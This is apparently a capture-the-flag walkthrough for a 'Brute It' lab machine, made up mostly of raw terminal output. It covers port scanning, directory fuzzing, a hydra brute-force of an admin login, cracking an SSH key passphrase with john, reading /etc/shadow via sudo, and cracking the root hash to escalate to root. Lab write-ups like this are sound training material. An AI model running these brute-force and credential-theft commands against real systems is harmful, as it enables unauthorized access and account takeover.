## Objetivo
## Pistas
## Solución

```

1////

┌──(kali㉿kali)-[~]
└─$ nmap -n -Pn -sV 10.10.102.28 --min-rate 5000 -vv -oN brute

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 19:27 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Connect Scan at 19:27
Scanning 10.10.102.28 [1000 ports]
Discovered open port 22/tcp on 10.10.102.28
Discovered open port 80/tcp on 10.10.102.28
Completed Connect Scan at 19:27, 0.78s elapsed (1000 total ports)
Initiating Service scan at 19:27
Scanning 2 services on 10.10.102.28
Completed Service scan at 19:27, 6.63s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.102.28.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:27
Completed NSE at 19:27, 1.34s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:27
Completed NSE at 19:27, 0.96s elapsed
Nmap scan report for 10.10.102.28
Host is up, received user-set (0.29s latency).
Scanned at 2024-10-16 19:27:10 EDT for 10s
Not shown: 709 filtered tcp ports (no-response), 289 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack /OpenSSH/ 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd /2.4.29/ ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

ffuf -u http://10.10.102.28/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 50 -ic



///////


http://10.10.102.28/admin/

Inspeccionamos la pagina

        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>




└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.102.28 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64


[80][http-post-form] host: 10.10.102.28   login: admin   password: xavier

# Hello john, finish the development of the site, here's your [RSA private key.](http://10.10.102.28/admin/panel/id_rsa)

admin:xavier
  
  

THM{brut3_f0rce_is_e4sy}




////

──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ ssh2john id_rsa > id_rsa.txt 

┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ john id_rsa.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
.....

Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-10-16 19:49) 4.347g/s 315686p/s 315686c/s 315686C/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

rockinroll


──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ chmod 600 id_rsa    
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ ssh -i id_rsa john@10.10.102.28
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 16 23:54:25 UTC 2024

  System load:  0.0                Processes:           102
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 39%                IP address for eth0: 10.10.102.28
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
john@bruteit:~$ 



john@bruteit:~$ sudo /bin/cat /etc/shadow
john@bruteit:~$ sudo /bin/cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::


┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ nano hash-root                              
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ cat hash-root               
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ john hash-root -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:00 DONE (2024-10-16 19:58) 4.545g/s 1163p/s 1163c/s 1163C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                   
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/brute]
└─$ 


john@bruteit:~$ whoami
john
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# 

root@bruteit:/home/john# cd /root
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
root@bruteit:~# 


```
## Notas adicionale
s
## Referencias